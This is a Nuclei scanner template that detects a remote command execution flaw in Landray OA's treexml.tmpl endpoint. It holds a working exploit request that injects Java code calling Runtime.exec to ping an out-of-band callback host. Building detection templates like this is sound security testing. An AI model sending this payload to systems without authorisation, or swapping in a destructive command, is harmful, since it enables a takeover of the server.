id: landray-oa-treexml-rce

info:
  name: 蓝凌OA(Landray) treexml.tmpl - 命令执行(CNVD-2022-403066)
  author: tangxiaofeng7
  severity: critical
  description: 蓝凌OA treexml.tmpl存在远程命令执行漏洞,攻击者通过发送特定的请求包可以获取服务器权限.
  reference:
    - https://github.com/tangxiaofeng7
  tags: landray

http:
  - method: POST
    path:
      - '{{BaseURL}}/data/sys-common/treexml.tmpl'

    body: |
        s_bean=ruleFormulaValidate&script=try {String cmd = "ping {{interactsh-url}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}

    headers:
      Pragma: no-cache
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "dns"
          - "http"